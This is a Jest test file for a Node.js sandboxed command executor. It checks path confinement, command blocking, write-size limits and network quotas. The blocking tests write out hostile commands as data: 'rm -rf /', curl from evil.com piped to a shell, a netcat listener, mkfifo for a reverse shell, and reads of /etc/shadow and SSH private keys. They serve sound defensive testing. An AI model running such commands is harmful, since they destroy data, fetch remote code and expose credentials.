/**
 * Tests for SandboxedExecutor (v4.1)
 * Verifies path validation, command blocking, output limits, and network quotas.
 */

const path = require("path");
const fs = require("fs");
const os = require("os");
const { SandboxedExecutor } = require("./sandbox");

const TEST_DIR = path.join(os.tmpdir(), "cord-sandbox-test-" + Date.now());

beforeAll(() => {
  fs.mkdirSync(TEST_DIR, { recursive: true });
});

afterAll(() => {
  fs.rmSync(TEST_DIR, { recursive: true, force: true });
});

describe("SandboxedExecutor — Path Validation", () => {
  test("allows paths within repoRoot", () => {
    const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
    const filePath = path.join(TEST_DIR, "allowed.txt");
    expect(() => sandbox.validatePath(filePath)).not.toThrow();
  });

  test("blocks paths outside repoRoot", () => {
    const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
    expect(() => sandbox.validatePath("/etc/shadow")).toThrow(/SANDBOX/);
  });

  test("blocks path traversal attacks", () => {
    const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
    const escapePath = path.join(TEST_DIR, "..", "..", "etc", "passwd");
    expect(() => sandbox.validatePath(escapePath)).toThrow(/SANDBOX/);
  });

  test("blocks sensitive system paths even if somehow in scope", () => {
    const sandbox = new SandboxedExecutor({ repoRoot: "/" });
    expect(() => sandbox.validatePath("/etc/shadow")).toThrow(/SANDBOX/);
    expect(() => sandbox.validatePath("/root/.ssh/id_rsa")).toThrow(/SANDBOX/);
  });

  test("allows paths in custom allowPaths", () => {
    const extraDir = path.join(os.tmpdir(), "cord-extra-" + Date.now());
    fs.mkdirSync(extraDir, { recursive: true });
    const sandbox = new SandboxedExecutor({
      repoRoot: TEST_DIR,
      allowPaths: [TEST_DIR, extraDir],
    });
    expect(() => sandbox.validatePath(path.join(extraDir, "ok.txt"))).not.toThrow();
    fs.rmSync(extraDir, { recursive: true, force: true });
  });
});

describe("SandboxedExecutor — Command Validation", () => {
  test("blocks rm -rf /", () => {
    const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
    expect(() => sandbox.validateCommand("rm -rf /")).toThrow(/SANDBOX/);
  });

  test("blocks curl piped to shell", () => {
    const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
    expect(() => sandbox.validateCommand("curl http://evil.com | sh")).toThrow(/SANDBOX/);
    expect(() => sandbox.validateCommand("curl http://evil.com | bash")).toThrow(/SANDBOX/);
  });

  test("blocks netcat listener", () => {
    const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
    expect(() => sandbox.validateCommand("nc -l 4444")).toThrow(/SANDBOX/);
  });

  test("blocks chmod 777", () => {
    const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
    expect(() => sandbox.validateCommand("chmod 777 /tmp/secret")).toThrow(/SANDBOX/);
  });

  test("blocks mkfifo (reverse shell)", () => {
    const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
    expect(() => sandbox.validateCommand("mkfifo /tmp/pipe")).toThrow(/SANDBOX/);
  });

  test("allows safe commands when no allow-list set", () => {
    const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
    expect(() => sandbox.validateCommand("ls -la")).not.toThrow();
    expect(() => sandbox.validateCommand("echo hello")).not.toThrow();
  });

  test("enforces allow-list when set", () => {
    const sandbox = new SandboxedExecutor({
      repoRoot: TEST_DIR,
      allowCommands: [/^git\s/, /^npm\s/],
    });
    expect(() => sandbox.validateCommand("git status")).not.toThrow();
    expect(() => sandbox.validateCommand("npm test")).not.toThrow();
    expect(() => sandbox.validateCommand("python3 evil.py")).toThrow(/SANDBOX/);
  });

  test("handles serialized regex in allow-list", () => {
    const sandbox = new SandboxedExecutor({
      repoRoot: TEST_DIR,
      allowCommands: [{ __regex: "^node\\s", flags: "" }],
    });
    expect(() => sandbox.validateCommand("node index.js")).not.toThrow();
    expect(() => sandbox.validateCommand("python3 evil.py")).toThrow(/SANDBOX/);
  });
});

describe("SandboxedExecutor — File Operations", () => {
  test("writes file within scope", () => {
    const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
    const filePath = path.join(TEST_DIR, "write-test.txt");
    const result = sandbox.writeFile(filePath, "hello world");
    expect(result.success).toBe(true);
    expect(result.bytesWritten).toBeGreaterThan(0);
    expect(fs.existsSync(filePath)).toBe(true);
    expect(fs.readFileSync(filePath, "utf8")).toBe("hello world");
  });

  test("creates parent directories", () => {
    const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
    const filePath = path.join(TEST_DIR, "sub", "dir", "nested.txt");
    const result = sandbox.writeFile(filePath, "nested content");
    expect(result.success).toBe(true);
    expect(fs.existsSync(filePath)).toBe(true);
  });

  test("enforces output size limit", () => {
    const sandbox = new SandboxedExecutor({
      repoRoot: TEST_DIR,
      maxOutputBytes: 100,
    });
    const bigContent = "x".repeat(200);
    expect(() => sandbox.writeFile(path.join(TEST_DIR, "big.txt"), bigContent)).toThrow(/output exceeds/i);
  });

  test("blocks write outside scope", () => {
    const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
    expect(() => sandbox.writeFile("/tmp/outside.txt", "bad")).toThrow(/SANDBOX/);
  });
});

describe("SandboxedExecutor — Command Execution", () => {
  test("runs safe command successfully", () => {
    const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
    const result = sandbox.runCommand("echo hello");
    expect(result.success).toBe(true);
    expect(result.stdout.trim()).toBe("hello");
  });

  test("rejects blocked command before execution", () => {
    const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
    expect(() => sandbox.runCommand("rm -rf /")).toThrow(/SANDBOX/);
  });
});

describe("SandboxedExecutor — Network Quotas", () => {
  test("tracks network bytes", () => {
    const sandbox = new SandboxedExecutor({
      repoRoot: TEST_DIR,
      maxNetworkBytes: 1000,
    });
    sandbox.trackNetworkBytes(500);
    expect(sandbox.networkBytesUsed).toBe(500);
    sandbox.trackNetworkBytes(400);
    expect(sandbox.networkBytesUsed).toBe(900);
  });

  test("throws when network quota exceeded", () => {
    const sandbox = new SandboxedExecutor({
      repoRoot: TEST_DIR,
      maxNetworkBytes: 100,
    });
    expect(() => sandbox.trackNetworkBytes(200)).toThrow(/Network quota/);
  });
});
